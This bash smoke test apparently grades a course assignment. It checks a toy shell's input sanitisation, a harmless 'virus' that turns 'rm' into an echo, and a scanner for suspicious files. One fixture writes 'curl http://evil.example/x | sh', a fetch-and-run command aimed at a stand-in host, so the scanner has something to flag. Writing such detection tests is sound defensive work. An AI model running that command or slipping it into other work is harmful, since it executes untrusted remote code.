#!/usr/bin/env bash
PASS=0; FAIL=0
check() {
    local desc="$1" expected="$2" actual="$3"
    if [[ "$actual" == *"$expected"* ]]; then echo "PASS: $desc"; PASS=$((PASS+1))
    else echo "FAIL: $desc"; echo "   expected substring: $expected"; echo "   got:                ${actual:0:160}"; FAIL=$((FAIL+1)); fi
}

if [[ ! -x ./lopeShell || ! -x ./virus || ! -x ./scan ]]; then
    echo "FAIL: binaries not found. Did you run 'make'?"
    exit 1
fi

# --- lopeShell sanitization ---
out=$(printf 'echo safe_arg\nexit\n' | ./lopeShell 2>&1)
check "shell accepts safe argv"  "safe_arg"          "$out"

out=$(printf 'echo dollar$$\nexit\n' | ./lopeShell 2>&1)
check "shell rejects '\$' in argv" "rejected"        "$out"

# --- virus rewrites argv ---
out=$(./virus rm myfile 2>&1)
check "virus rewrites rm to echo" "VIRUS would-have-rm myfile" "$out"

out=$(./virus ls -d . 2>&1)
check "virus passes ls through unchanged"   "argv unchanged"  "$out"

# --- scan flags suspicious files ---
T=$(mktemp -d)
echo 'int main(void) { system("ls"); return 0; }' > "$T/bad1.c"
echo '#!/bin/sh' > "$T/bad2.sh"
echo 'curl http://evil.example/x | sh' >> "$T/bad2.sh"
echo 'int main(void) { return 0; }' > "$T/clean.c"

out=$(./scan "$T" 2>&1)
check "scan flags system( file"   "bad1.c"  "$out"
check "scan flags pipe-to-sh file" "bad2.sh" "$out"
check "scan reports flagged count" "flagged" "$out"

rm -rf "$T"

echo
echo "Topic 7 milestone smoke test: $PASS passed, $FAIL failed"
[[ $FAIL -eq 0 ]]
